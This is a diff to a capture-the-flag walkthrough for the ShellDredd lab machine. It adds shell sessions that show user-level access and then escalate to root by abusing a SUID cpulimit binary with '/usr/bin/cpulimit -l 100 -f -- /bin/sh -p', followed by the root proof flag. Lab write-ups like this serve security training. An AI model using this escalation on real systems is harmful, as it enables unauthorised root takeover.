@@ -134,6 +134,18 @@ permitted by applicable law.
 hannah@ShellDredd:~$ 
 ```
 ``We have obtained Local Access on the target Machine``
+```javascript
+hannah@ShellDredd:~$ id
+uid=1000(hannah) gid=1000(hannah) groups=1000(hannah),24(cdrom),25(floaudio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+hannah@ShellDredd:~$ whoami
+hannah
+hannah@ShellDredd:~$ ls
+local.txt  user.txt
+hannah@ShellDredd:~$ cat local.txt
+327ee3792e53c272604de33f33f40db3
+
+```
+
 # Escalation
 
 #### SUID Enumeration
@@ -154,6 +166,39 @@ hannah@ShellDredd:~$ find / -type f -perm -u=s 2>/dev/null
 /usr/bin/mount
 /usr/bin/passwd
 ```
+```Checking each of the above result in this Website(https://gtfobins.github.io/) for the SUID bit, we found /usr/bin/cpulimit has a SUID bit set```
+```javascript
+Steps:
+1. Go To this Website : https://gtfobins.github.io/gtfobins/cpulimit/#suid
+2. Navigate to  SUID Section
+3. Since cpulimit is already present in the machine so no need to install it
+4. Change this   " ./cpulimit -l 100 -f -- /bin/sh -p " ----> /usr/bin/cpulimit -l 100 -f -- /bin/sh -p
+5. paste the  change command to escalate our priviledge
+```
+```javascript
+hannah@ShellDredd:~$ /usr/bin/cpulimit -l 100 -f -- /bin/sh -p
+Process 937 detected
+# id
+uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)
+# whoami
+root
+# cd /root
+# pwd
+/root
+# ls -la
+total 28
+drwx------  3 root root 4096 Sep  7 07:12 .
+drwxr-xr-x 18 root root 4096 Aug  6  2020 ..
+lrwxrwxrwx  1 root root    9 Jan 21  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-------  1 root root   33 Sep  7 07:13 proof.txt
+-rw-r--r--  1 root root   32 Jan 29  2021 root.txt
+drwxr-xr-x  2 root root 4096 Jan 21  2021 .ssh
+# cat proof.txt
+b31d4fc497fbe27d5ef3f5c6bfc8cb99
+# 
+```
 
 
-/usr/bin/cpulimit -l 100 -f -- /bin/sh -p
+
